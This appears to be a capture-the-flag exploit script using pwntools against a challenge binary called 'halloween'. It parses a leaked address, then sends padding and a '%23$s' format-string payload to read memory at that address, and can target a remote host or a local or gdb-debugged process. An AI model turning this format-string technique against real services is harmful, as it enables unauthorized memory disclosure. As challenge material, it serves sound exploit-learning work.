import re
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('lmao.lol', 6001)
elif args.HOST:
    p = process('./halloween')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '75']
    p = gdb.debug('./halloween',
                  gdbscript='''
                  b *main+144
                  c
                  ''')

p.recvuntil(b'variable @').decode('utf-8').strip()
text = p.recvline().strip(b'\n')

# Use a bytes pattern in re search
hex_value = re.search(b'0x[0-9a-fA-F]+', text)

# Check if a match is found and convert to integer
if hex_value:
    hex_number = int(hex_value.group(), 16)
    print(hex_value.group(), text)
else:
    print("No hex value found")

padding = cyclic((0x100 - 0x80), alphabet=string.ascii_uppercase, n=8).encode()

# p.sendline(padding + b"%p......" * 16)
# p.sendline(b"A" * (0x100 - 0x80) + b"%p......" * (16) + b"B" * 8 + p64(hex_number))
p.sendline(padding + b"%23$s..." + p64(hex_number))
p.interactive()
